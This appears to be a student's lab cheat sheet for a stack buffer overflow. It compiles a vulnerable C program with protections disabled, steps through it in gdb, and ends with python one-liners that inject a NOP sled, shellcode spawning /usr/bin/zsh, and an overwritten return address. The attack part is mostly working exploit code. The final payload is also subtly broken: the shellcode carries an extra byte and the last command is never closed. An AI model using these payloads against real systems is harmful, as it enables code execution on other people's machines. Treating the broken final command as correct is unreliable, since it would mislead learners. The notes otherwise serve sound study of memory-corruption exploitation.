Commands

## compile the code
gcc -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g vuln.c -o vuln

## clean the environment, debug
chmod +x envexec.sh
./envexec.sh -d vuln

## clean the environment, execute exploit
./envexec.sh /root/vuln $(python ...)

## run gdb, load a program to analyze
gdb vuln

GDB commands

## quit the debugger
quit

## clear the screen
ctrl + l
shell clear

## show debugging symbols, ie. code
list
list main

## show the assemlby code
disas main

## examine information
info os

info functions

info variables

## run the program, with input
run Hello

## run the overflow, seg fault
run $(python -c 'print "\x41" * 508')

## examine memory address
x/200x ($esp - 550)

## confirm overwrite of ebp register
info registers

## find a location, below ESP (stack pointer)
EDI = destination index, string / array copying
ESI = source index, string + array copying

EIP = index pointer, next address to execute
EBP = stack base pointer
ESP = stack pointer, starting in high memory, going down
EDX = data register

## run the overflow, launch a zsh shell
run $(python -c 'print "\x90" * 426 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\x51\x51\x51\x51" * 10')

## examine memory address
x/200x ($esp - 550)

## convert memeory address to little endian
ecx            0xbfffffc0	-1073741888
edx            0xbffffc3a	-1073742790
ebx            0xb7fb8000	-1208254464
esp            0xbffffc40	0xbffffc40
ebp            0x51515151	0x51515151

0xbf ff fa ba
\xba\xfa\xff\xbf


## run the exploit, execut /bin/zsh5
run $(python -c 'print "\x90" * 425 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\xba\xfa\xff\xbf" * 10
